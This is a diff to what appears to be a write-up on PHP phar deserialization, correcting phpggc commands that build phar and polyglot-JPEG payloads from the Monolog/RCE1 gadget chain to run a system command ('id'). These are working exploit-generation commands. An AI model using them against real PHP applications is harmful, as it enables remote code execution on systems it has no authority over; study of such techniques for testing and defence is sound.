@@ -47,7 +47,8 @@ Touching that path deserializes the metadata and runs the chain. In practice **P
 
 ```bash
 phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
-phpggc -p phar -pj exploit.gif Monolog/RCE1 system 'id'   # polyglot JPEG
+# polyglot: -pj/--phar-jpeg takes an EXISTING valid JPEG to embed into, and -o names the output
+phpggc -pj base.jpg -o exploit.jpg Monolog/RCE1 system 'id'
 ```
 
 ## Exploitation notes
